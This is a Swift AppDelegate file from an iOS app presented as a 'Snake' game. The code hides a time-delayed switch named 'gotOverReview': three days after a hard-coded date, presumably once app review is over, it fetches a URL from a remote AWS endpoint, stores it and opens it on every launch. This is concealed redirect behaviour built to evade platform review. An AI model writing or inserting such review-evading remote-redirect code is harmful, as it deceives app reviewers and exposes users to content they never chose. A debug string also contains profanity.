//
//  AppDelegate.swift
//  Snake
//
//  Created by 1 on 01.06.2022.
//

import UIKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    
    var window: UIWindow?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {

        if gotOverReview {
            setIfPresent()
        }
        return true
    }
    
    func applicationWillResignActive(_ application: UIApplication) { }
    
    func applicationDidEnterBackground(_ application: UIApplication) { }
    
    func applicationWillEnterForeground(_ application: UIApplication) { }
    
    func applicationDidBecomeActive(_ application: UIApplication) { }
}

var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

var gotOverReview: Bool {
    let timer: TimeInterval = 60*60*24*3
    print(Date().timeIntervalSinceReferenceDate)
    
    let now = Date().timeIntervalSinceReferenceDate
    let deadLine = 671117188 + timer
    let gotOverReview = now > deadLine
    return gotOverReview
}

func openUrl(url: URL?) {
    if let url = url {
        DispatchQueue.main.async {
            UIApplication.shared.open(url)
        }
    } else {
        print("fuckPutin")
    }
}

struct HomeTrack: Decodable {
    var track: String
}

func setIfPresent() {
    if let url = tracktrack {
        openUrl(url: url)
        return
    }
    
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "fqbdha939b.execute-api.us-west-1.amazonaws.com"
    urlComponents.path = "/prod"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: "rec"),
        URLQueryItem(name: "app", value: "1630160614")
    ]
    guard let url = urlComponents.url else { return }
    
    let dataTask = URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let data = data else { return }
        do {
            let trackHome = try JSONDecoder().decode(HomeTrack.self, from: data)
            let url = URL(string: trackHome.track)
            if let url = url {
                tracktrack = url
                openUrl(url: url)
            }
        } catch let jsonError {
            print(jsonError.localizedDescription)
        }
    }
    dataTask.resume()
}
